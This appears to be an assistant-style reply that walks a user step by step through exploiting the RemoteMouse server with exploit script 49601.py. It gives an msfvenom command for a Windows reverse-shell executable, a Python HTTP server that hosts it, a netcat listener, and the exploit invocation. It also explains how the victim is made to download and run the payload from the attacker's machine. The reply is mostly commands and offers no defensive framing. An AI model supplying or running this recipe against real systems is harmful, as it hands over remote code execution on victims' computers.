RemoteMouse.exe 

That Python script relies on a **2-stage payload delivery**.

Instead of typing out a long reverse shell line character-by-character over keystrokes (which breaks easily), `49601.py` uses the simulated keyboard input to force the victim machine to open `cmd.exe` and download an executable payload (like a `msfvenom` reverse shell) hosted on your Kali machine.

Here is the exact setup to make that script work in 60 seconds:

### Step 1: Generate Your Payload on Kali

Use `msfvenom` to create an executable reverse shell named `shell.exe`:

Bash

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<YOUR_KALI_IP> LPORT=4444 -f exe -o shell.exe
```

### Step 2: Host the Payload via Python HTTP Server

In the exact directory where you generated `shell.exe`, start a basic web server:

Bash

```
python3 -m http.server 80
```

_(Leave this terminal running! This is the "http server" the script is yapping about)._

### Step 3: Start Your Netcat Listener

Open a second terminal and set up your listener to catch the shell:

Bash

```
nc -lvnp 4444
```

### Step 4: Fire the Exploit

Open a third terminal and execute `49601.py` using your arguments:

Bash

```
python3 49601.py <TARGET_IP> <YOUR_KALI_IP> shell.exe
```

### What Will Happen

1. The script will talk to `MouseServer` on port 1978 and simulate typing `Win + R`.
    
2. It types a command forcing the target to hit `http://<YOUR_KALI_IP>/shell.exe` and save it to disk.
    
3. You will see a `200 OK` hit in your Python web server terminal.
    
4. The script executes `shell.exe` on the victim, giving you a full shell in your Netcat window.